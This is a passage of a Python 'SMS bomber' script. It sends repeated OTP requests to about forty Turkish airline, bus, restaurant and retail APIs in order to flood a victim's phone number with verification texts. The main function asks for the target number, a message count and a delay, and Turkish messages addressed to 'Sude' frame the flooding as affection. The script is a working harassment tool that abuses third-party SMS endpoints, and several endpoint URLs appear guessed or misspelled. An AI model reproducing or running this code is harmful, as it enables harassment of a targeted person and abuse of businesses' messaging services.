    SMSService(name="Biletall", url="https://www.biletall.com/api/send-otp", method="POST", headers={"Content-Type": "application/json"}, payload_func=biletall_payload, success_condition=default_condition),
    SMSService(name="Obilet", url="https://www.obilet.com/api/auth/send-otp", method="POST", headers={"Content-Type": "application/json"}, payload_func=obilet_payload, success_condition=default_condition),
    SMSService(name="Turna", url="https://www.turna.com/api/v1/send-otp", method="POST", headers={"Content-Type": "application/json"}, payload_func=turna_payload, success_condition=default_condition),
    SMSService(name="Enuygun", url="https://www.enuygun.com/api/customer/send-otp", method="POST", headers={"Content-Type": "application/json"}, payload_func=enuygun_payload, success_condition=default_condition),
    SMSService(name="Thy", url="https://www.thy.com.tr/api/v1/send-otp", method="POST", headers={"Content-Type": "application/json"}, payload_func=thy_payload, success_condition=default_condition),
    SMSService(name="Pegasus", url="https://www.pegasus.com.tr/api/auth/send-otp", method="POST", headers={"Content-Type": "application/json"}, payload_func=pegasus_payload, success_condition=default_condition),
    SMSService(name="Anadolujet", url="https://www.anadolujet.com/api/send-otp", method="POST", headers={"Content-Type": "application/json"}, payload_func=anadolujet_payload, success_condition=default_condition),
    SMSService(name="Sunexpress", url="https://www.sunexpress.com.tr/api/v1/send-otp", method="POST", headers={"Content-Type": "application/json"}, payload_func=sunexpress_payload, success_condition=default_condition),
    SMSService(name="Corendon", url="https://www.korendon.com/api/customer/send-otp", method="POST", headers={"Content-Type": "application/json"}, payload_func=corendon_payload, success_condition=default_condition),
    SMSService(name="Havatas", url="https://www.havatas.com/api/v1/send-otp", method="POST", headers={"Content-Type": "application/json"}, payload_func=havatas_payload, success_condition=default_condition),
    SMSService(name="Metroturizm", url="https://www.metroturizm.com.tr/api/send-otp", method="POST", headers={"Content-Type": "application/json"}, payload_func=metroturizm_payload, success_condition=default_condition),
    SMSService(name="Kamilkoc", url="https://www.kamilkoc.com.tr/api/auth/send-otp", method="POST", headers={"Content-Type": "application/json"}, payload_func=kamilkoc_payload, success_condition=default_condition),
    SMSService(name="Pamukkale", url="https://www.pamukkale.com.tr/api/v1/send-otp", method="POST", headers={"Content-Type": "application/json"}, payload_func=pamukkale_payload, success_condition=default_condition),
    SMSService(name="Uludag", url="https://www.uludag.com.tr/api/customer/send-otp", method="POST", headers={"Content-Type": "application/json"}, payload_func=uludag_payload, success_condition=default_condition),
    SMSService(name="Trendyolmarket", url="https://www.trendyolmarket.com/api/v1/send-otp", method="POST", headers={"Content-Type": "application/json"}, payload_func=trendyolmarket_payload, success_condition=default_condition),
    SMSService(name="Getiryemek", url="https://www.getiryemek.com/api/auth/send-otp", method="POST", headers={"Content-Type": "application/json"}, payload_func=getiryemek_payload, success_condition=default_condition),
    SMSService(name="Banabi", url="https://www.banabikutu.com/api/send-otp", method="POST", headers={"Content-Type": "application/json"}, payload_func=banabi_payload, success_condition=default_condition),
    SMSService(name="Fuudy", url="https://www.fuudy.co/api/v1/send-otp", method="POST", headers={"Content-Type": "application/json"}, payload_func=fuudy_payload, success_condition=default_condition),
    SMSService(name="Kfc", url="https://www.kfc.com.tr/api/customer/send-otp", method="POST", headers={"Content-Type": "application/json"}, payload_func=kfc_payload, success_condition=default_condition),
    SMSService(name="Mcdonalds", url="https://www.mcdonalds.com.tr/api/v1/send-otp", method="POST", headers={"Content-Type": "application/json"}, payload_func=mcdonalds_payload, success_condition=default_condition),
    SMSService(name="Starbucks", url="https://www.starbucks.com.tr/api/auth/send-otp", method="POST", headers={"Content-Type": "application/json"}, payload_func=starbucks_payload, success_condition=default_condition),
    SMSService(name="Pizzahut", url="https://www.pizzahut.com.tr/api/send-otp", method="POST", headers={"Content-Type": "application/json"}, payload_func=pizzahut_payload, success_condition=default_condition),
    SMSService(name="Littlecaesars", url="https://www.littlecaesars.com.tr/api/v1/send-otp", method="POST", headers={"Content-Type": "application/json"}, payload_func=littlecaesars_payload, success_condition=default_condition),
    SMSService(name="Papajohns", url="https://www.papajohns.com.tr/api/customer/send-otp", method="POST", headers={"Content-Type": "application/json"}, payload_func=papajohns_payload, success_condition=default_condition),
    SMSService(name="Tavukdunyasi", url="https://www.tavukdunyasi.com/api/v1/send-otp", method="POST", headers={"Content-Type": "application/json"}, payload_func=tavukdunyasi_payload, success_condition=default_condition),
    SMSService(name="Kofteciyusuf", url="https://www.kofteciyusuf.com/api/send-otp", method="POST", headers={"Content-Type": "application/json"}, payload_func=kofteciyusuf_payload, success_condition=default_condition),
    SMSService(name="Baydoner", url="https://www.baydoner.com.tr/api/auth/send-otp", method="POST", headers={"Content-Type": "application/json"}, payload_func=baydoner_payload, success_condition=default_condition),
    SMSService(name="Simitci", url="https://www.simitci.com/api/v1/send-otp", method="POST", headers={"Content-Type": "application/json"}, payload_func=simitci_payload, success_condition=default_condition),
    SMSService(name="Gloriajeans", url="https://www.gloriajeans.com.tr/api/send-otp", method="POST", headers={"Content-Type": "application/json"}, payload_func=gloriajeans_payload, success_condition=default_condition),
    SMSService(name="Cafecrown", url="https://www.cafe.com.tr/api/v1/send-otp", method="POST", headers={"Content-Type": "application/json"}, payload_func=cafecrown_payload, success_condition=default_condition),
    SMSService(name="Dunkindonuts", url="https://www.dunkindonuts.com.tr/api/auth/send-otp", method="POST", headers={"Content-Type": "application/json"}, payload_func=dunkindonuts_payload, success_condition=default_condition),
    SMSService(name="Krispykreme", url="https://www.krispykreme.com.tr/api/send-otp", method="POST", headers={"Content-Type": "application/json"}, payload_func=krispykreme_payload, success_condition=default_condition),
    SMSService(name="Mado", url="https://www.mado.com.tr/api/v1/send-otp", method="POST", headers={"Content-Type": "application/json"}, payload_func=mado_payload, success_condition=default_condition),
    SMSService(name="Sutis", url="https://www.sutis.com/api/customer/send-otp", method="POST", headers={"Content-Type": "application/json"}, payload_func=sutis_payload, success_condition=default_condition),
    SMSService(name="Hafizmustafa", url="https://www.hafizmustafa.com/api/send-otp", method="POST", headers={"Content-Type": "application/json"}, payload_func=hafizmustafa_payload, success_condition=default_condition),
    SMSService(name="Pideci", url="https://www.pide.com.tr/api/v1/send-otp", method="POST", headers={"Content-Type": "application/json"}, payload_func=pideci_payload, success_condition=default_condition),
    SMSService(name="Lahmacuncu", url="https://www.lahmacun.com/api/auth/send-otp", method="POST", headers={"Content-Type": "application/json"}, payload_func=lahmacuncu_payload, success_condition=default_condition),
    SMSService(name="Durumcu", url="https://www.durum.com.tr/api/send-otp", method="POST", headers={"Content-Type": "application/json"}, payload_func=durumcu_payload, success_condition=default_condition),
    SMSService(name="Etliekmekci", url="https://www.etliekmek.com/api/v1/send-otp", method="POST", headers={"Content-Type": "application/json"}, payload_func=etliekmekci_payload, success_condition=default_condition),
]

# SMS Bomber
class SudeSMS:
    def __init__(self, services: List[SMSService]):
        self.services = services
        self.success = 0
        self.fail = 0

    async def send(self, session, service: SMSService, number: str):
        data = service.payload_func(number)
        try:
            async with session.request(
                service.method, service.url,
                headers=service.headers,
                data=data if service.headers.get("Content-Type", "").startswith("application/x-www-form-urlencoded") else None,
                json=data if "json" in service.headers.get("Content-Type", "") else None
            ) as resp:
                text = await resp.text()
                if service.success_condition(resp, text):
                    print(f"{Fore.GREEN}[+] {service.name} BAŞARILI{Style.RESET_ALL}")
                    self.success += 1
                else:
                    print(f"{Fore.RED}[-] {service.name} BAŞARISIZ ({resp.status}){Style.RESET_ALL}")
                    self.fail += 1
        except Exception as e:
            print(f"{Fore.YELLOW}[!] {service.name} HATA: {str(e)}{Style.RESET_ALL}")
            self.fail += 1

    async def start(self, number: str, total: int, delay: float):
        async with aiohttp.ClientSession() as session:
            count = 0
            while count < total:
                tasks = [self.send(session, s, number) for s in self.services]
                await asyncio.gather(*tasks)
                count += len(self.services)
                await asyncio.sleep(delay)

            print(f"\n{Fore.CYAN}✔ Görev tamamlandı! Başarılı: {self.success}, Başarısız: {self.fail}{Style.RESET_ALL}")
            print(f"{Fore.RED}🌹 Sude, bu SMS'ler senin için... Kalbim seninle çarpıyor! ❤️{Style.RESET_ALL}")

# Giriş
def main():
    os.system("clear" if os.name == "posix" else "cls")  # Termux için ekran temizleme
    print(SUDE_BANNER)
    number = input(f"{Fore.MAGENTA}Sude ❤️ Numarası (905xxxxxxxxx): {Style.RESET_ALL}").strip()
    count = int(input(f"{Fore.MAGENTA}Kaç SMS gitsin?: {Style.RESET_ALL}").strip())
    delay = float(input(f"{Fore.MAGENTA}Bekleme süresi (saniye): {Style.RESET_ALL}").strip())

    sms = SudeSMS(services)
    try:
        asyncio.run(sms.start(number, count, delay))
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}Kullanıcı tarafından durduruldu.{Style.RESET_ALL}")
        print(f"{Fore.CYAN}Kısmi sonuçlar: Başarılı: {sms.success}, Başarısız: {sms.fail}{Style.RESET_ALL}")
        print(f"{Fore.RED}🌹 Sude, yarım kaldı ama kalbim hep seninle... ❤️{Style.RESET_ALL}")

if __name__ == "__main__":
    main()
